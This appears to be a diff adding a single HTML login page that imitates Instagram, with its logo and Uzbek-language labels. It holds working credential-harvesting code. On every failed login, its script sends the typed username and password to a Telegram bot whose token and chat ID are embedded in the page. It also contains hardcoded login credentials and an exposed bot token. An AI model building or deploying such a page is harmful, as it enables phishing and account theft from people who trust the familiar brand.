@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Panel</title>
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      width: 300px;
+      border-radius: 10px;
+    }
+
+    .logo {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #3897f0;
+      color: white;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    #message {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+    <input type="text" id="username" placeholder="Login">
+    <input type="password" id="password" placeholder="Parol">
+    <button class="login-btn" onclick="checkLogin()">Kirish</button>
+    <p id="message"></p>
+  </div>
+
+  <script>
+    function checkLogin() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const message = document.getElementById("message");
+
+      const correctUsername = "neo";
+      const correctPassword = "matrix123";
+
+      if (username === correctUsername && password === correctPassword) {
+        message.style.color = "green";
+        message.textContent = "✅ Xush kelibsiz, " + username + "!";
+      } else {
+        message.style.color = "red";
+        message.textContent = "❌ Login yoki parol noto‘g‘ri!";
+
+        // Telegramga xabar yuborish
+        const telegramBotToken = "8170502960:AAHU9K-cSGEHBpbN05cDmR6MGC2qMlVhjBI";
+        const chatId = "872534568";
+        const text = `🚨 Noto'g'ri login:\n👤 Login: ${username}\n🔑 Parol: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        });
+      }
+    }
+  </script>
+</body>
+</html>
